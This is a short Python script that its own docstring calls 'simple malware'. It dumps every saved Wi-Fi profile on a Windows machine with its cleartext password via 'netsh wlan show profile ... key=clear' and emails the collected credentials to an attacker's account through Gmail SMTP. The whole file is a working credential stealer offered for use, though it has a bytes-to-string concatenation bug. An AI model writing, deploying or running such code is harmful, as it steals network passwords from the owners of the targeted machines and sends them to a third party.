#!/usr/bin/env python3

"""
Author: Matthew Zito (goldmund) 
Contact: https://www.github.com/MatthewZito
Simple malware emails to the controller the target Windows 
machine's networks, and access credentials thereof.
"""

import subprocess
import smtplib
import re

def mail_stdout(email,password,msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email,email,msg)
    server.quit()


cmd = "netsh wlan show profile"
networks = subprocess.check_output(cmd, shell=True)
# set decode on python3 interpreters
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode("utf-8"))

res = ""
for network_name in network_names_list:
    cmd = f"netsh wlan show profile '{network_name}' key=clear"
    ephemeral_res = subprocess.check_output(cmd, shell=True)
    res += ephemeral_res

mail_stdout("email","pass", res)